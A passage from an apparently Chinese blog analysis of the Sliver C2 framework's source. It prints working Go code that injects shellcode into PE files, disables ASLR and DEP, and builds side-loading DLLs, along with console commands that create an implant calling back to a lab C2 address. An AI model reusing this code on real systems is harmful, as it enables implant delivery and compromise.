class="line">&#125;</div><div class="line"><span class="keyword">var</span> entryPoint, sectionAlignment, fileAlignment, scAddr uint32</div><div class="line"><span class="keyword">var</span> imageBase uint64</div><div class="line"><span class="keyword">var</span> shellcode []byte</div><div class="line">lastSection :<span class="type"></span>= peFile.Sections[peFile.NumberOfSections<span class="number">-1</span>]</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">switch</span> hdr :<span class="type"></span>= (peFile.OptionalHeader).(type) &#123;</div><div class="line"><span class="keyword">case</span> *pe.OptionalHeader32:<span class="type"></span></div><div class="line"><span class="type">imageBase </span>= uint64(hdr.ImageBase) <span class="comment">// cast this back to a uint32 before use in 32bit</span></div><div class="line">entryPoint = hdr.AddressOfEntryPoint</div><div class="line">sectionAlignment = hdr.SectionAlignment</div><div class="line">fileAlignment = hdr.FileAlignment</div><div class="line">scAddr = align(lastSection.Size, fileAlignment, lastSection.Offset) <span class="comment">//PointerToRawData</span></div><div class="line">shellcode = api.ApplySuffixJmpIntel32(shellcodeBytes, scAddr, entryPoint+uint32(imageBase), binary.LittleEndian)</div><div class="line"><span class="keyword">break</span></div><div class="line"><span class="keyword">case</span> *pe.OptionalHeader64:<span class="type"></span></div><div class="line"><span class="type">imageBase </span>= hdr.ImageBase</div><div class="line">entryPoint = hdr.AddressOfEntryPoint</div><div class="line">sectionAlignment = hdr.SectionAlignment</div><div class="line">fileAlignment = hdr.FileAlignment</div><div class="line">scAddr = align(lastSection.Size, fileAlignment, lastSection.Offset) <span class="comment">//PointerToRawData</span></div><div class="line">shellcode = api.ApplySuffixJmpIntel32(shellcodeBytes, scAddr, entryPoint+uint32(imageBase), binary.LittleEndian)</div><div class="line"><span class="keyword">break</span></div><div class="line">&#125;</div><div class="line"><span class="comment">// Add a New Section Method (most common)</span></div><div class="line">shellcodeLen :<span class="type"></span>= len(shellcode)</div><div class="line"><span class="keyword">new</span><span class="type">section</span> :<span class="type"></span>= <span class="keyword">new</span><span class="type"></span>(pe.Section)</div><div class="line"><span class="keyword">new</span><span class="type">section</span>.Name = <span class="string">"."</span> + RandomString(<span class="number">5</span>)</div><div class="line">o :<span class="type"></span>= []byte(<span class="keyword">new</span><span class="type">section</span>.Name)</div><div class="line"><span class="keyword">new</span><span class="type">section</span>.OriginalName = [<span class="number">8</span>]byte&#123;o[<span class="number">0</span>], o[<span class="number">1</span>], o[<span class="number">2</span>], o[<span class="number">3</span>], o[<span class="number">4</span>], o[<span class="number">5</span>], <span class="number">0</span>, <span class="number">0</span>&#125;</div><div class="line"><span class="keyword">new</span><span class="type">section</span>.VirtualSize = uint32(shellcodeLen)</div><div class="line"><span class="keyword">new</span><span class="type">section</span>.VirtualAddress = align(lastSection.VirtualSize, sectionAlignment, lastSection.VirtualAddress)</div><div class="line"><span class="keyword">new</span><span class="type">section</span>.Size = align(uint32(shellcodeLen), fileAlignment, <span class="number">0</span>)                <span class="comment">//SizeOfRawData</span></div><div class="line"><span class="keyword">new</span><span class="type">section</span>.Offset = align(lastSection.Size, fileAlignment, lastSection.Offset) <span class="comment">//PointerToRawData</span></div><div class="line"><span class="keyword">new</span><span class="type">section</span>.Characteristics = pe.IMAGE_SCN_CNT_CODE | pe.IMAGE_SCN_MEM_EXECUTE | pe.IMAGE_SCN_MEM_READ</div><div class="line"><span class="comment">//</span></div><div class="line">peFile.InsertionAddr = scAddr</div><div class="line">peFile.InsertionBytes = shellcode</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">switch</span> hdr :<span class="type"></span>= (peFile.OptionalHeader).(type) &#123;</div><div class="line"><span class="keyword">case</span> *pe.OptionalHeader32:<span class="type"></span></div><div class="line"><span class="type">v </span>:= <span class="keyword">new</span><span class="type">section</span>.VirtualSize</div><div class="line"><span class="keyword">if</span> v == <span class="number">0</span> &#123;</div><div class="line">v = <span class="keyword">new</span><span class="type">section</span>.Size <span class="comment">// SizeOfRawData</span></div><div class="line">&#125;</div><div class="line">hdr.SizeOfImage = align(v, sectionAlignment, <span class="keyword">new</span><span class="type">section</span>.VirtualAddress)</div><div class="line">hdr.AddressOfEntryPoint = <span class="keyword">new</span><span class="type">section</span>.VirtualAddress</div><div class="line">hdr.CheckSum = <span class="number">0</span></div><div class="line"><span class="comment">// disable ASLR</span></div><div class="line">hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</div><div class="line">hdr.DataDirectory[<span class="number">5</span>].VirtualAddress = <span class="number">0</span></div><div class="line">hdr.DataDirectory[<span class="number">5</span>].Size = <span class="number">0</span></div><div class="line">peFile.FileHeader.Characteristics |= pe.IMAGE_FILE_RELOCS_STRIPPED</div><div class="line"><span class="comment">//disable DEP</span></div><div class="line">hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT</div><div class="line"><span class="comment">// zero out cert table offset and size</span></div><div class="line">hdr.DataDirectory[<span class="number">4</span>].VirtualAddress = <span class="number">0</span></div><div class="line">hdr.DataDirectory[<span class="number">4</span>].Size = <span class="number">0</span></div><div class="line"><span class="keyword">break</span></div><div class="line"><span class="keyword">case</span> *pe.OptionalHeader64:<span class="type"></span></div><div class="line"><span class="type">v </span>:= <span class="keyword">new</span><span class="type">section</span>.VirtualSize</div><div class="line"><span class="keyword">if</span> v == <span class="number">0</span> &#123;</div><div class="line">v = <span class="keyword">new</span><span class="type">section</span>.Size <span class="comment">// SizeOfRawData</span></div><div class="line">&#125;</div><div class="line">hdr.SizeOfImage = align(v, sectionAlignment, <span class="keyword">new</span><span class="type">section</span>.VirtualAddress)</div><div class="line">hdr.AddressOfEntryPoint = <span class="keyword">new</span><span class="type">section</span>.VirtualAddress</div><div class="line">hdr.CheckSum = <span class="number">0</span></div><div class="line"><span class="comment">// disable ASLR</span></div><div class="line">hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE</div><div class="line">hdr.DataDirectory[<span class="number">5</span>].VirtualAddress = <span class="number">0</span></div><div class="line">hdr.DataDirectory[<span class="number">5</span>].Size = <span class="number">0</span></div><div class="line">peFile.FileHeader.Characteristics |= pe.IMAGE_FILE_RELOCS_STRIPPED</div><div class="line"><span class="comment">//disable DEP</span></div><div class="line">hdr.DllCharacteristics ^= pe.IMAGE_DLLCHARACTERISTICS_NX_COMPAT</div><div class="line"><span class="comment">// zero out cert table offset and size</span></div><div class="line">hdr.DataDirectory[<span class="number">4</span>].VirtualAddress = <span class="number">0</span></div><div class="line">hdr.DataDirectory[<span class="number">4</span>].Size = <span class="number">0</span></div><div class="line"><span class="keyword">break</span></div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">peFile.FileHeader.NumberOfSections++</div><div class="line">peFile.Sections = append(peFile.Sections, <span class="keyword">new</span><span class="type">section</span>)</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">return</span> peFile.Bytes()</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x02-dllhijack功能"><a href="#0x02-dllhijack功能" class="headerlink" title="0x02 dllhijack功能"></a>0x02 dllhijack功能</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dllhijack功能原理基于Dll侧加载技术，</p><figure class="highlight cs"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">[<span class="meta">server</span>] sliver (DEVELOPING_BULL) &gt; profiles <span class="keyword">new</span> -f shared -m <span class="number">192.168</span><span class="number">.117</span><span class="number">.138</span>  -R dllhijack_dll</div><div class="line">[<span class="meta">*</span>] Saved <span class="keyword">new</span> implant profile dllhijack_dll</div><div class="line"><span class="comment">//</span></div><div class="line">[<span class="meta">server</span>] sliver (DEVELOPING_BULL) &gt; profiles</div><div class="line"> Profile Name         Implant Type   Platform        Command &amp; Control                 Debug   Format       Obfuscation   Limitations </div><div class="line">==================== ============== =============== ================================= ======= ============ ============= =============</div><div class="line"> backdoor_shellcode   session        windows/amd64   [<span class="number">1</span>] mtls:<span class="comment">//192.168.117.138:8888   false   SHELLCODE    enabled                   </span></div><div class="line"> dllhijack_dll        session        windows/amd64   [<span class="number">1</span>] mtls:<span class="comment">//192.168.117.138:8888   false   SHARED_LIB   enabled   </span></div><div class="line"><span class="comment">//</span></div><div class="line">[<span class="meta">server</span>] sliver (DEVELOPING_BULL) &gt; dllhijack -r e:\\Sliver\\test.dll -p dllhijack_dll e:\\Sliver\test2.dll</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最终调用位于<code>https://github.com/BishopFox/sliver/blob/master/server/rpc/rpc-hijack.go</code>的<code>HijackDLL</code>函数。如果存在reference DLL,则读取reference DLL数据。如果不存在，则下载目标Dll，并读取。然后读取Profile数据，最后调用<code>cloneExports</code>方法。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div></pre></td><td class="code"><pre><div class="line">func (rpc *Server) HijackDLL(ctx context<span class="selector-class">.Context</span>, req *clientpb.DllHijackReq) (*clientpb<span class="selector-class">.DllHijack</span>, error) </div><div class="line">&#123;</div><div class="line"><span class="selector-tag">var</span> (</div><div class="line">refDLL        []byte</div><div class="line">targetDLLData []byte</div><div class="line">)</div><div class="line">resp := &amp;clientpb.DllHijack&#123;</div><div class="line">Response: &amp;commonpb.Response&#123;&#125;,</div><div class="line">&#125;</div><div class="line">session := core<span class="selector-class">.Sessions</span><span class="selector-class">.Get</span>(req<span class="selector-class">.Request</span><span class="selector-class">.SessionID</span>)</div><div class="line"><span class="keyword">if</span> session == nil &#123;</div><div class="line">return resp, ErrInvalidSessionID</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> session<span class="selector-class">.OS</span> != <span class="string">"windows"</span> &#123;</div><div class="line">return nil, status.Error(codes<span class="selector-class">.InvalidArgument</span>, fmt.Sprintf(</div><div class="line"><span class="string">"this feature is not supported on the target operating system (%s)"</span>, session<span class="selector-class">.OS</span>,</div><div class="line">))</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// download reference DLL if we don't have one in the request</span></div><div class="line"><span class="keyword">if</span> len(req.ReferenceDLL) == <span class="number">0</span> &#123;</div><div class="line">download, err := rpc.Download(context.Background(), &amp;sliverpb.DownloadReq&#123;</div><div class="line">Request: &amp;commonpb.Request&#123;</div><div class="line">SessionID: session<span class="selector-class">.ID</span>,</div><div class="line">Timeout:   int64(<span class="number">30</span>),</div><div class="line">&#125;,</div><div class="line">Path: req<span class="selector-class">.ReferenceDLLPath</span>,</div><div class="line">&#125;)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, status.Error(codes<span class="selector-class">.InvalidArgument</span>, fmt.Sprintf(</div><div class="line"><span class="string">"could not download the reference DLL: %s"</span>, err.Error(),</div><div class="line">))</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> download<span class="selector-class">.Encoder</span> == <span class="string">"gzip"</span> &#123;</div><div class="line">download<span class="selector-class">.Data</span>, err = new(encoders.Gzip).Decode(download.Data)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">refDLL = download.Data</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">refDLL = req.ReferenceDLL</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> req<span class="selector-class">.ProfileName</span> != <span class="string">""</span> &#123;</div><div class="line">profiles, err := rpc.ImplantProfiles(context.Background(), &amp;commonpb.Empty&#123;&#125;)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line"><span class="selector-tag">var</span> <span class="selector-tag">p</span> *clientpb.ImplantProfile</div><div class="line"><span class="keyword">for</span> _, prof := range profiles<span class="selector-class">.Profiles</span> &#123;</div><div class="line"><span class="keyword">if</span> prof<span class="selector-class">.Name</span> == req<span class="selector-class">.ProfileName</span> &#123;</div><div class="line"><span class="selector-tag">p</span> = prof</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> <span class="selector-tag">p</span>.GetName() == <span class="string">""</span> &#123;</div><div class="line">return nil, status.Error(codes<span class="selector-class">.InvalidArgument</span>, fmt.Sprintf(</div><div class="line"><span class="string">"no profile found for name %s"</span>, req<span class="selector-class">.ProfileName</span>,</div><div class="line">))</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> <span class="selector-tag">p</span><span class="selector-class">.Config</span><span class="selector-class">.Format</span> != clientpb<span class="selector-class">.OutputFormat_SHARED_LIB</span> &#123;</div><div class="line">return nil, status.Error(codes<span class="selector-class">.InvalidArgument</span>,</div><div class="line"><span class="string">"please select a profile targeting a shared library format"</span>,</div><div class="line">)</div><div class="line">&#125;</div><div class="line">name, config := generate.ImplantConfigFromProtobuf(<span class="selector-tag">p</span>.Config)</div><div class="line"><span class="keyword">if</span> name == <span class="string">""</span> &#123;</div><div class="line">name, err = codenames.GetCodename()</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line">&#125;</div><div class="line">otpSecret, _ := cryptography.TOTPServerSecret()</div><div class="line">err = generate.GenerateConfig(name, config, true)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line">fPath, err := generate.SliverSharedLibrary(name, otpSecret, config, true)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">targetDLLData, err = os.ReadFile(fPath)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line"><span class="keyword">if</span> len(req.TargetDLL) == <span class="number">0</span> &#123;</div><div class="line">return nil, errors.New(<span class="string">"missing target DLL"</span>)</div><div class="line">&#125;</div><div class="line">targetDLLData = req.TargetDLL</div><div class="line">&#125;</div><div class="line"><span class="comment">// call clone</span></div><div class="line">result, err := cloneExports(targetDLLData, refDLL, req.ReferenceDLLPath)</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return resp, fmt.Errorf(<span class="string">"failed to clone exports: %s"</span>, err)</div><div class="line">&#125;</div><div class="line">targetBytes, err := result.Bytes()</div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return resp, fmt.Errorf(<span class="string">"failed to convert PE to bytes: %s"</span>, err)</div><div class="line">&#125;</div><div class="line"><span class="comment">// upload new dll</span></div><div class="line">uploadGzip := new(encoders.Gzip).Encode(targetBytes)</div><div class="line"><span class="comment">// upload to remote target</span></div><div class="line">upload, err := rpc.Upload(context.Background(), &amp;sliverpb.UploadReq&#123;</div><div class="line">Encoder: <span class="string">"gzip"</span>,</div><div class="line">Data:    uploadGzip,</div><div class="line">Path:    req<span class="selector-class">.TargetLocation</span>,</div><div class="line">Request: &amp;commonpb.Request&#123;</div><div class="line">SessionID: session<span class="selector-class">.ID</span>,</div><div class="line">Timeout:   int64(minTimeout),</div><div class="line">&#125;,</div><div class="line">&#125;)</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> err != nil &#123;</div><div class="line">return nil, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="keyword">if</span> upload<span class="selector-class">.Response</span> != nil &amp;&amp; upload<span class="selector-class">.Response</span><span class="selector-class">.Err</span> != <span class="string">""</span> &#123;</div><div class="line">return nil, fmt.Errorf(upload<span class="selector-class">.Response</span><span class="selector-class">.Err</span>)</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">return resp, nil</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在<code>cloneExports</code>方法中。<code>cloneExports</code>主要逻辑就是在目标dll中新增一个节区，重新制作导出表，实现侧加载。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">func</span> <span class="title">cloneExports</span><span class="params">(targetPE []<span class="keyword">byte</span>, referencePE []<span class="keyword">byte</span>, refPath <span class="keyword">string</span>)</span> <span class="params">(*pe.File, error)</span> </span></div><div class="line"><span class="function"></span>&#123;</div><div class="line"><span class="keyword">var</span> (</div><div class="line">tgt                = bytes.NewReader(targetPE)</div><div class="line">ref                = bytes.NewReader(referencePE)</div><div class="line">refExportDirectory pe.DataDirectory</div><div class="line">)</div><div class="line">refPath = strings.ReplaceAll(refPath, <span class="string">".dll"</span>, <span class="string">""</span>)</div><div class="line">tgtFile, err := pe.NewFile(tgt)</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">refFile, err := pe.NewFile(ref)</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">&#125;</div><div class="line"><span class="keyword">switch</span> hdr := (refFile.OptionalHeader).(<span class="keyword">type</span>) &#123;</div><div class="line"><span class="keyword">case</span> *pe.OptionalHeader32:</div><div class="line">refExportDirectory = hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]</div><div class="line"><span class="keyword">case</span> *pe.OptionalHeader64:</div><div class="line">refExportDirectory = hdr.DataDirectory[pe.IMAGE_DIRECTORY_ENTRY_EXPORT]</div><div class="line">&#125;</div><div class="line">refExports, err := refFile.Exports()</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> <span class="built_in">len</span>(refExports) == <span class="number">0</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, errors.New(<span class="string">"reference binary has no exports"</span>)</div><div class="line">&#125;</div><div class="line"><span class="keyword">var</span> exportNames []<span class="keyword">string</span></div><div class="line"><span class="keyword">for</span> _, exp := <span class="keyword">range</span> refExports &#123;</div><div class="line"><span class="keyword">var</span> newName <span class="keyword">string</span></div><div class="line"><span class="keyword">if</span> exp.Name != <span class="string">""</span> &#123;</div><div class="line">newName = fmt.Sprintf(<span class="string">"%s.%s"</span>, refPath, exp.Name)</div><div class="line">&#125; <span class="keyword">else</span> &#123;</div><div class="line">newName = fmt.Sprintf(<span class="string">"%s.#%d"</span>, refPath, exp.Ordinal)</div><div class="line">&#125;</div><div class="line">exportNames = <span class="built_in">append</span>(exportNames, newName)</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">tgtFile.DosStub = refFile.DosStub</div><div class="line">exportNamesBlob := strings.Join(exportNames, <span class="string">"\x00"</span>)</div><div class="line">exportNamesBlob += <span class="string">"\x00"</span></div><div class="line">forwardNameBlock := []<span class="keyword">byte</span>(exportNamesBlob)</div><div class="line">newSectionSize := refExportDirectory.Size + <span class="keyword">uint32</span>(<span class="built_in">len</span>(exportNamesBlob))</div><div class="line">newSection, err := addSection(tgtFile, <span class="string">".rdata2"</span>, <span class="keyword">uint32</span>(newSectionSize))</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Update the export directory size and virtual address</span></div><div class="line"><span class="keyword">switch</span> hdr := (tgtFile.OptionalHeader).(<span class="keyword">type</span>) &#123;</div><div class="line"><span class="keyword">case</span> *pe.OptionalHeader32:</div><div class="line">hdr.DataDirectory[<span class="number">0</span>].VirtualAddress = newSection.VirtualAddress</div><div class="line">hdr.DataDirectory[<span class="number">0</span>].Size = newSectionSize</div><div class="line"><span class="keyword">case</span> *pe.OptionalHeader64:</div><div class="line">hdr.DataDirectory[<span class="number">0</span>].VirtualAddress = newSection.VirtualAddress</div><div class="line">hdr.DataDirectory[<span class="number">0</span>].Size = newSectionSize</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line">delta := newSection.VirtualAddress - refExportDirectory.VirtualAddress</div><div class="line">exportDirOffset := refFile.RVAToFileOffset(refExportDirectory.VirtualAddress)</div><div class="line">sectionData := <span class="built_in">make</span>([]<span class="keyword">byte</span>, newSection.Size)</div><div class="line"><span class="comment">// Write the new export table into the section</span></div><div class="line">n := <span class="built_in">copy</span>(sectionData, referencePE[exportDirOffset:exportDirOffset+refExportDirectory.Size])</div><div class="line"><span class="keyword">if</span> n &lt; <span class="keyword">int</span>(refExportDirectory.Size) &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"only copied %d bytes"</span>, n)</div><div class="line">&#125;</div><div class="line"><span class="comment">// Write the forward name block</span></div><div class="line">n = <span class="built_in">copy</span>(sectionData[refExportDirectory.Size:], forwardNameBlock)</div><div class="line"><span class="keyword">if</span> n &lt; <span class="keyword">int</span>(refExportDirectory.Size) &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"only copied %d bytes"</span>, n)</div><div class="line">&#125;</div><div class="line"><span class="comment">// Update the section data</span></div><div class="line">sectionDataReader := bytes.NewReader(sectionData)</div><div class="line">tgtFile.Section(newSection.Name).Replace(sectionDataReader, <span class="keyword">int64</span>(<span class="built_in">len</span>(sectionData)))</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Get the updated byte slice representation of the target file</span></div><div class="line">tgtBytes, err := tgtFile.Bytes()</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// We're not using pe.ExportDirectory because it contains a string field (DllName)</span></div><div class="line"><span class="comment">// which makes it unusable with binary.Read, and I did not want to manually parse</span></div><div class="line"><span class="comment">// all the fields because I'm lazy.</span></div><div class="line">newExportDirectory := exportDirectory&#123;&#125;</div><div class="line">err = binary.Read(bytes.NewReader(tgtBytes[newSection.Offset:]), binary.LittleEndian, &amp;newExportDirectory)</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">&#125;</div><div class="line"><span class="comment">// Update the export directory</span></div><div class="line">newExportDirectory.AddressTableAddr += delta</div><div class="line">newExportDirectory.NameTableAddr += delta</div><div class="line">newExportDirectory.OrdinalTableAddr += delta</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Write it back to the target file byte slice</span></div><div class="line">buf := <span class="built_in">new</span>(bytes.Buffer)</div><div class="line">err = binary.Write(buf, binary.LittleEndian, &amp;newExportDirectory)</div><div class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</div><div class="line">&#125;</div><div class="line">n = <span class="built_in">copy</span>(tgtBytes[newSection.Offset:], buf.Bytes())</div><div class="line"><span class="keyword">if</span> n &lt; buf.Len() &#123;</div><div class="line"><span class="keyword">return</span> <span class="literal">nil</span>, fmt.Errorf(<span class="string">"only read %d bytes, expected %d"</span>, n, buf.Len())</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Link function addresses to forward names</span></div><div class="line">forwardOffset := newSection.VirtualAddress + refExportDirectory.Size</div><div class="line">rawAddressOfFunctions := tgtFile.RVAToFileOffset(newExportDirectory.AddressTableAddr)</div><div class="line"><span class="keyword">for</span> i := <span class="keyword">uint32</span>(<span class="number">0</span>); i &lt; newExportDirectory.NumberOfFunctions; i++ &#123;</div><div class="line">offset := rawAddressOfFunctions + (<span class="number">4</span> * i)</div><div class="line">forwardName := exportNames[i]</div><div class="line">binary.LittleEndian.PutUint32(tgtBytes[offset:], forwardOffset)</div><div class="line">forwardOffset += <span class="keyword">uint32</span>(<span class="built_in">len</span>(forwardName) + <span class="number">1</span>)</div><div class="line">&#125;</div><div class="line"><span class="comment">//</span></div><div class="line"><span class="comment">// Apply delta to export names</span></div><div class="line">rawAddressOfNames := tgtFile.RVAToFileOffset(newExportDirectory.NameTableAddr)</div><div class="line"><span class="keyword">for</span> i := <span class="keyword">uint32</span>(<span class="number">0</span>); i &lt; newExportDirectory.NumberOfNames; i++ &#123;</div><div class="line">offset := rawAddressOfNames + (<span class="number">4</span> * i)</div><div class="line">data := binary.LittleEndian.Uint32(tgtBytes[offset:])</div><div class="line">binary.LittleEndian.PutUint32(tgtBytes[offset:], (data + delta))</div><div class="line">&#125;</div><div class="line"><span class="comment">// Return the new pe.File</span></div><div class="line"><span class="keyword">return</span> pe.NewFile(bytes.NewReader(tgtBytes))</div><div class="line">&#125;</div></pre></td></tr></table></figure><h3 id="0x03-ExecuteAssembly"><a 